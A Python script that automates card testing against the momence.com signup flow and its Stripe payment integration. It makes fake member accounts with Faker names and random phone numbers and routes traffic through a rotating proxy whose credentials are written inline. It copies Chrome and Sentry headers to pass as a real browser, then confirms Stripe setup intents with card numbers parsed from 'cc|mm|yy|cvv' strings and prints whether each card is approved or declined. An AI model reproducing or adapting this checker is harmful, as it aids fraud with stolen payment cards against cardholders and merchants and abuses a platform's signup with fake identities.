import requests
import random
import string
import json
from faker import Faker

fake = Faker('en_US')
session = requests.Session()

def generar_usuario_fake():
    """Genera usuario fake completo con nombres aleatorios"""
    nombre = fake.first_name()
    apellido = fake.last_name()
    email = f"{nombre.lower()}{apellido.lower()}{random.randint(1000, 9999)}@gmail.com"

    mayuscula = random.choice(string.ascii_uppercase)
    numero = random.randint(0, 9)
    caracteres = string.ascii_lowercase + string.digits
    password = mayuscula + ''.join(random.choices(caracteres, k=6)) + str(numero) + '@'
    password = ''.join(random.sample(password, len(password)))

    area_code = random.randint(200, 999)
    exchange = random.randint(200, 999)
    while exchange == 555:
        exchange = random.randint(200, 999)
    line_number = random.randint(1000, 9999)
    telefono = f"+1{area_code}{exchange}{line_number}"

    return {
        "nombre": nombre,
        "apellido": apellido,
        "email": email,
        "password": password,
        "telefono": telefono
    }

# Configurar proxy
PROXY_URL = "http://qaxtdvtr-US-rotate:cpyp473gyvje@p.webshare.io:80"
session.proxies = {
    'http': PROXY_URL,
    'https': PROXY_URL,
}


def singup(max_retries=5):
    global session
    url = "https://momence.com/_api/primary/api/SignUpMember"

    for attempt in range(max_retries):
        usuario = generar_usuario_fake()

        headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es-US,es;q=0.9',
        'baggage': 'sentry-environment=production,sentry-release=dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7,sentry-public_key=b971b0b45d8542e081b13763234cb46c,sentry-trace_id=f9845ceb78d84c7e97bc7c9dfde35bd5,sentry-sample_rate=0,sentry-sampled=false',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://momence.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://momence.com/sign-up/visitor?hostId=21138',
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': 'f9845ceb78d84c7e97bc7c9dfde35bd5-86445e741ef7ec3c-0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        'x-app': 'dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7',
        'x-idempotence-key': 'cfdbab22-c08c-438c-ac56-2ad70c50d73e',
        'x-origin': 'https://momence.com/sign-up/visitor?hostId=21138',
        }

        json_data = {
        'email': usuario["email"],
        'firstName': usuario["nombre"],
        'lastName': usuario["apellido"],
        'password': usuario["password"],
        'hostId': 21138,
        'waiverAccepted': False,
        'privacyPolicyAccepted': False,
        'phone': usuario["telefono"],
        'language': 'en',
        }

        res = session.post(url, headers=headers, json=json_data)
        print("singup")
        print(res.status_code)
        print(res.text)

        try:
            response_data = res.json()

            if 'error' in response_data and "Phone number is not valid" in response_data.get('error', ''):
                print(f"⚠️ Intento {attempt + 1}/{max_retries}: Número de teléfono inválido, reintentando con nueva sesión...")
                session = requests.Session()
                session.proxies = {
                    'http': PROXY_URL,
                    'https': PROXY_URL,
                }
                continue

            member_id = response_data.get('memberId')
            if member_id:
                return member_id
            else:
                return None
        except Exception:
            return None

    print(f"❌ Falló después de {max_retries} intentos")
    return None
     


def checkacc():
    url = "https://momence.com/dashboard/u/32681226/"

    headers = {
        'accept': 'application/json, text/plain, */*',
    'accept-language': 'es-US,es;q=0.9',
    'baggage': 'sentry-environment=production,sentry-release=dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7,sentry-public_key=b971b0b45d8542e081b13763234cb46c,sentry-trace_id=f9845ceb78d84c7e97bc7c9dfde35bd5,sentry-sample_rate=0,sentry-sampled=false',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://momence.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://momence.com/sign-up/visitor?hostId=21138',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': 'f9845ceb78d84c7e97bc7c9dfde35bd5-86445e741ef7ec3c-0',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'x-app': 'dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7',
    'x-idempotence-key': 'cfdbab22-c08c-438c-ac56-2ad70c50d73e',
    'x-origin': 'https://momence.com/sign-up/visitor?hostId=21138',
    # 'cookie': 'csrf_token=4c23b99c-809d-4a08-b8a1-31c9c21b3f38; _gcl_au=1.1.254756657.1782877966; slireg=https://scout.us3.salesloft.com; sliguid=c4561484-ab45-44ba-9bb3-e9bf8beefdce; slirequested=true; _gid=GA1.2.462757566.1782877969; _gat_UA-217829872-1=1; _twpid=tw.1782877969354.503122209652911015; _fbp=fb.1.1782877970300.996051868193475909; _clck=7x1eyg%5E2%5Eg7d%5E0%5E2373; __hstc=122408916.500c5a6aaaaf6cc9dae14346b965301f.1782877972162.1782877972162.1782877972162.1; hubspotutk=500c5a6aaaaf6cc9dae14346b965301f; __hssrc=1; mp_35bc22b37317a3a4fa9963087f2c5dce_mixpanel=%7B%22distinct_id%22%3A%20%2219f1bced9d348c-0416a088a1c296-26061051-144000-19f1bced9d41b8%22%2C%22%24device_id%22%3A%20%2219f1bced9d348c-0416a088a1c296-26061051-144000-19f1bced9d41b8%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fmomence.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22momence.com%22%7D; __hssc=122408916.2.1782877972163; _ga=GA1.2.136461788.1782877969; _uetsid=54731cf0750011f1bfe4f765d7f6c84b; _uetvid=54734db0750011f1bf377bf2a1f7077d; _clsk=1nltx5%5E1782877984803%5E3%5E1%5Ei.clarity.ms%2Fcollect; _ga_15XG1YV951=GS2.1.s1782877968$o1$g1$t1782878008$j20$l0$h0',
    
    }

    res = session.get(url, headers=headers)
    
    html = res.text
    with open("checkacc.html", "w", encoding="utf-8") as f:
        f.write(html)


def getwallet():
    headers = {
    'accept': 'application/json',
    'accept-language': 'es-US,es;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    }

    data = {
        'stripe_js_id': 'e32bbc5b-ab02-4de4-85fa-c410107e5380',
        'referrer_host': 'momence.com',
        'key': 'pk_live_RoPa2iuvwBbqEISUd2LYTmKF',
        'request_surface': 'web_card_element_popup',
        'elements_init_source': 'stripe.elements',
    }

    response = session.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data)



def checkout(cc, cvv, mes, ano,seti,setik):
    usuario = generar_usuario_fake()
    nombre_completo = f"{usuario['nombre']}+{usuario['apellido']}"
    email_encoded = usuario['email'].replace('@', '%40')

    headers = {
    'accept': 'application/json',
    'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
}

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]={nombre_completo}&payment_method_data[billing_details][email]={email_encoded}&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=fc6857a8-8ae6-4e19-bd4c-835ed3646daa26be8c&payment_method_data[muid]=0a55ba39-9dbf-44c2-939e-e47091b8c119928a09&payment_method_data[sid]=89583dcd-23e8-4b60-8278-7bfb792d08b2df0332&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff4f6a26ca2%3B+stripe-js-v3%2Ff4f6a26ca2%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmomence.com&payment_method_data[time_on_page]=112095&payment_method_data[client_attribution_metadata][client_session_id]=09bd8a11-0b8b-4c9d-9a81-10af7cc09607&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]=74926404-48a4-4ddf-a89d-d0f74afa2a64&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_RoPa2iuvwBbqEISUd2LYTmKF&client_attribution_metadata[client_session_id]=09bd8a11-0b8b-4c9d-9a81-10af7cc09607&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=74926404-48a4-4ddf-a89d-d0f74afa2a64&client_secret={setik}'

    response = session.post(
        f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
        headers=headers,
        data=data,
    )

    print(response.status_code)
    print(response.text)
    try:
        data = response.json()
        if 'error' in data:
            code = data['error'].get('code')
            decline_code = data['error'].get('decline_code')
            message = data['error'].get('message')
            print(f"code: {code}")
            print(f"decline_code: {decline_code}")
            print(f"message: {message}")
            return code, decline_code, message
        else:
            status = data.get('status', 'unknown')
            if status == 'succeeded':
                print(f"code: approved")
                print(f"decline_code: success")
                print(f"message: approved")
                return 'approved', 'success', 'approved'
            else:
                print(f"code: {status}")
                return status, 'unknown', f'{status}'
    except Exception as e:
        print(f"Error parsing response: {e}")
        return None, None, None

def cleancc(cc):
    cc = cc.replace(" ", "").replace("\n", "").replace("\r", "")
    if "|" in cc:
        parts = cc.split("|")
        if len(parts) == 4:
            ano = parts[2][-2:] if len(parts[2]) == 4 else parts[2]
            return parts[0], parts[1], ano, parts[3]
    mes = cc[4:6]
    ano = cc[8:10][-2:] if len(cc[8:10]) == 4 else cc[8:10] 
    cvv = cc[10:13]
    return cc, mes, ano, cvv


def setup(id):

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
    'baggage': 'sentry-environment=production,sentry-release=dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7,sentry-public_key=b971b0b45d8542e081b13763234cb46c,sentry-trace_id=9da03574331f49ec8e7ce1aac17dcde8,sentry-sample_rate=0,sentry-sampled=false',
    'cache-control': 'no-cache',
    # 'content-length': '0',
    'origin': 'https://momence.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://momence.com/dashboard/u/32681120/my-account',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': '9da03574331f49ec8e7ce1aac17dcde8-aa0e3e76636790a9-0',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'x-app': 'dashboard-f7b4471c835b0aeb41c0ecf9205b0c6aeb909ab7',
    'x-idempotence-key': '69c6f64c-95ea-454d-a3d6-1859212a1bd1',
    'x-origin': f'https://momence.com/dashboard/u/{id}/my-account',
    # 'cookie': '__stripe_mid=0a55ba39-9dbf-44c2-939e-e47091b8c119928a09; mp_35bc22b37317a3a4fa9963087f2c5dce_mixpanel=%7B%22distinct_id%22%3A%20%2219f1bbf20bf19f2-067919a73b03cd8-26061051-144000-19f1bbf20c025cb%22%2C%22%24device_id%22%3A%20%2219f1bbf20bf19f2-067919a73b03cd8-26061051-144000-19f1bbf20c025cb%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fomemeditation.org%2F%22%2C%22%24initial_referring_domain%22%3A%20%22omemeditation.org%22%7D; _gcl_au=1.1.1392518404.1782876939; _gid=GA1.2.1985094753.1782876939; _twpid=tw.1782876939070.95347748945263662; _fbp=fb.1.1782876939310.463020809912206965; _clck=eczeq4%5E2%5Eg7d%5E0%5E2373; __hstc=122408916.7d3c32b8d5dc1a547eab8318330130f0.1782876940574.1782876940574.1782876940574.1; hubspotutk=7d3c32b8d5dc1a547eab8318330130f0; __hssrc=1; ribbon.connect.sid=s%3AL-l7DqGAHhx-iPrHgfefTURGRATBKxgN.45p3Mf6d5XhhPEZurK5xD9ZeEMBnpZNqsa6ASAKKwAY; _ga_30LJ50VV5V=GS2.1.s1782876459$o1$g1$t1782877115$j50$l0$h0; _ga_GPRFSYJB06=GS2.1.s1782876459$o1$g1$t1782877115$j50$l0$h0; _gat_UA-217829872-1=1; _ga=GA1.1.426732334.1782876459; _uetsid=ede8d75074fd11f19a0e432f004af7f6; _uetvid=ede93cb074fd11f188da7781ef2b2926; _clsk=jbg2is%5E1782879943684%5E8%5E0%5Er.clarity.ms%2Fcollect; _ga_15XG1YV951=GS2.1.s1782879903$o2$g1$t1782879945$j18$l0$h0',
}
    
    response = session.post(
        f'https://momence.com/_api/primary/portal/{id}/payment-methods/setup-platform-intent',
        headers=headers,
    )
    print("setup")
    print(response.status_code)
    print(response.text)
    print("---------------------------------")

    try:
        response_data = response.json()
        client_secret = response_data.get('clientSecret')
        setup_intent_id = response_data.get('setupIntentId')
        return setup_intent_id, client_secret
    except Exception:
        return None, None



def run(ccin):

    id = singup()

    getwallet()


    seti,setik =  setup(id)

    cc,mes,ano,cvv = cleancc(ccin)
    print(cc, mes, ano, cvv)


    code, decliene_code, message = checkout(cc, "000", mes, ano,seti,setik)
    print(code, decliene_code, message)


